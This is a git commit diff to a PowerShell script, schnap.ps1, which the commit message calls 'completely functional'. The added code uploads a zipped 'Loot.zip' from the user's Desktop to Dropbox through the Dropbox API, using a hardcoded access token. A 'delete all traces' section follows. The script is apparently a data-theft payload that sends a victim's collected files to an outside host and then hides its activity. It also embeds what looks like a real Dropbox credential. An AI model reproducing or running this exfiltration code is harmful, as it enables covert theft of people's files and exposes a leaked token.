90f58b4c88e4d978c6ddec8cf28522b8a08e22a5
Paddlboat <66689038+Paddlboat@users.noreply.github.com>
2022-11-27 14:38:08 +0100

    Update schnap.ps1
    Completely functional. Maybe there is atweak or workaround to keep the dropbox access token valid for more than 4h (would be convenient but is not necessary).

--- schnap.ps1
+++ schnap.ps1
@@ -7,9 +7,29 @@ $compress = @{
 }
 Compress-Archive @compress
 
-#Upload to Dropbox or other filesharing service [MISSING FOR NOW]
+#Upload to Dropbox or other filesharing service [DROPBOX ACCESS TOKEN IS ONLY VALID FOR 4H]
+function DropBox-Upload {
 
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$DropBoxAccessToken = "sl.BT6liqj3Ujet4tEfF5LRcbdVgWbOqqHxdtG0lLef9WaMsP7RfiDDDUiKCrJkY-2L_igtvvcs_066cEUakIQGjvnrAodohiunCkR47yyy2jE0M_4vD9oJSL75xz_KcmCueHEksS-n1jtn"   # Replace with your DropBox Access Token
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $DropBoxAccessToken
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
 
+$env:USERPROFILE + "\Desktop\Loot.zip" | DropBox-Upload
 
 #delete all traces
 
